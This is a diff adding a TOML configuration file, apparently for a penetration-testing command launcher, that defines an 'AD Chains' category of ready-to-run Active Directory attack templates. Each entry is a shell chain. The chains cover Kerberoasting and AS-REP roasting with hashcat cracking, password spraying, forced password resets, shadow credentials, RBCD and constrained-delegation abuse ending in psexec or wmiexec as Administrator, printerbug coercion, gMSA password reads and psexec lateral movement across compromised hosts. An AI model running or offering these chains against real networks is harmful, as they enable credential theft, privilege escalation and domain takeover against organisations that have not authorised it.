@@ -1,0 +1,139 @@
+category = "ad-chains"
+display_name = "AD Chains"
+icon = "󰓹"
+order = 34
+
+# Multi-step attack chains. These are documentation-as-commands — most paste a
+# `bash -c '...'` style multi-command pipeline you can edit before running.
+
+# === Kerberoast → crack → DCSync ===
+
+[[command]]
+id = "chain.kerberoast.fast"
+title = "Kerberoast → crack → DCSync (one-liner)"
+template = """impacket-GetUserSPNs '{domain}/{user}:{password}' -dc-ip {dc} -request -outputfile spn.hashes \\
+ && hashcat -m 13100 spn.hashes /usr/share/wordlists/rockyou.txt --quiet \\
+ && echo 'NOW: replace {user} with the cracked DA and re-run secretsdump'"""
+requires = ["impacket-GetUserSPNs", "hashcat"]
+tags = ["chain", "kerberoast"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+# === AS-REProast → crack → spray ===
+
+[[command]]
+id = "chain.asreproast.spray"
+title = "AS-REProast → crack → spray"
+template = """impacket-GetNPUsers '{domain}/' -usersfile users.txt -no-pass -dc-ip {dc} -format hashcat -outputfile asrep.hashes \\
+ && hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --quiet \\
+ && hashcat --show -m 18200 asrep.hashes | awk -F: '{{print $1\":\"$NF}}' > cracked.txt \\
+ && while IFS=: read u p; do nxc smb {target} -u \"$u\" -p \"$p\" --continue-on-success; done < cracked.txt"""
+requires = ["impacket-GetNPUsers", "hashcat", "nxc"]
+tags = ["chain", "asrep", "spray"]
+when = "target.has_dc"
+
+# === GenericWrite/GenericAll on user ===
+
+[[command]]
+id = "chain.genericwrite.shadow"
+title = "GenericWrite/GenericAll on user → shadow creds → TGT"
+template = """certipy-ad shadow auto -u '{user}@{domain}' -p '{password}' -account TARGET_USER \\
+ && echo 'PFX -> use certipy-ad auth -pfx target.pfx'"""
+requires = ["certipy-ad"]
+tags = ["chain", "shadow"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "chain.genericwrite.forcepw"
+title = "GenericAll on user → force password reset"
+template = """bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' set password TARGET_USER 'Pwn3d!1' \\
+ && nxc smb {target} -u TARGET_USER -p 'Pwn3d!1'"""
+requires = ["bloodyAD", "nxc"]
+tags = ["chain", "forcechangepw"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+# === RBCD (resource-based constrained delegation) ===
+
+[[command]]
+id = "chain.rbcd.full"
+title = "RBCD: add computer → write RBCD → S4U → psexec"
+template = """impacket-addcomputer '{domain}/{user}:{password}' -computer-name 'CHRONO\\$' -computer-pass 'Mach1neP@ss!' -dc-host {dc} \\
+ && bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add rbcd TARGET_HOST\\$ CHRONO\\$ \\
+ && impacket-getST -spn 'cifs/TARGET_HOST.{domain}' -impersonate Administrator '{domain}/CHRONO\\$:Mach1neP@ss!' -dc-ip {dc} \\
+ && export KRB5CCNAME=Administrator.ccache \\
+ && impacket-psexec -k -no-pass '{domain}/Administrator@TARGET_HOST.{domain}'"""
+requires = ["impacket-addcomputer", "bloodyAD", "impacket-getST", "impacket-psexec"]
+tags = ["chain", "rbcd"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+# === Constrained delegation ===
+
+[[command]]
+id = "chain.constrained.delegation"
+title = "Constrained delegation: getST → psexec as Administrator"
+template = """impacket-getST -spn 'cifs/TARGET_HOST.{domain}' -impersonate Administrator '{domain}/{user}:{password}' -dc-ip {dc} \\
+ && export KRB5CCNAME=Administrator.ccache \\
+ && impacket-wmiexec -k -no-pass '{domain}/Administrator@TARGET_HOST.{domain}'"""
+requires = ["impacket-getST", "impacket-wmiexec"]
+tags = ["chain", "delegation"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+# === Unconstrained delegation ===
+
+[[command]]
+id = "chain.unconstrained.printerbug"
+title = "Unconstrained delegation + printerbug → coerce TGT"
+template = """# 1) Listen for coerced TGT on attacker (krbrelayx --no-smb-server)\\
+python3 /opt/krbrelayx/krbrelayx.py -aesKey TARGET_HOST_AES_KEY \\
+ && # 2) Coerce DC to authenticate via MS-RPRN\\
+impacket-printerbug '{domain}/{user}:{password}@{dc}' TARGET_HOST.{domain}"""
+requires = ["python3", "impacket-printerbug"]
+tags = ["chain", "delegation", "coerce"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+# === gMSA → service hash ===
+
+[[command]]
+id = "chain.gmsa.read"
+title = "gMSA read: msDS-ManagedPassword → NTLM"
+template = """bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' -k \\
+  get object 'MSA_TARGET\\$' --attr msDS-ManagedPassword"""
+requires = ["bloodyAD"]
+tags = ["chain", "gmsa"]
+when = "creds.kind in ['plaintext','kerberos'] and target.has_dc"
+
+# === Password spray (low-and-slow) ===
+
+[[command]]
+id = "chain.spray.slow"
+title = "Slow password spray (one pass / 30min per round)"
+template = "nxc smb {target} -u users.txt -p 'Spring2025!' --jitter 5 --continue-on-success"
+requires = ["nxc"]
+tags = ["chain", "spray"]
+
+[[command]]
+id = "chain.spray.kerbrute_chunked"
+title = "Kerbrute spray (chunked, less noisy)"
+template = "kerbrute passwordspray -d {domain} --dc {dc} --delay 30000 users.txt 'Welcome1!'"
+requires = ["kerbrute"]
+tags = ["chain", "spray"]
+when = "target.has_dc"
+
+# === Lateral movement: hop via PsExec ===
+
+[[command]]
+id = "chain.lateral.hop"
+title = "Lateral hop: nxc test → impacket-psexec on first :Pwn3d:"
+template = """nxc smb {target} -u {user} -p '{password}' -d {domain} --continue-on-success | grep 'Pwn3d!' | awk '{{print $2}}' > pwn3d_hosts.txt \\
+ && for h in $(cat pwn3d_hosts.txt); do impacket-psexec '{domain}/{user}:{password}@'$h ; done"""
+requires = ["nxc", "impacket-psexec"]
+tags = ["chain", "lateral"]
+when = "creds.kind == 'plaintext'"
+
+# === SMB sign-disabled relay-friendly targets ===
+
+[[command]]
+id = "chain.signing.scan"
+title = "Find SMB signing OFF hosts (relay candidates)"
+template = "nxc smb {target} --gen-relay-list relay_targets.txt && cat relay_targets.txt"
+requires = ["nxc"]
+tags = ["chain", "relay", "recon"]
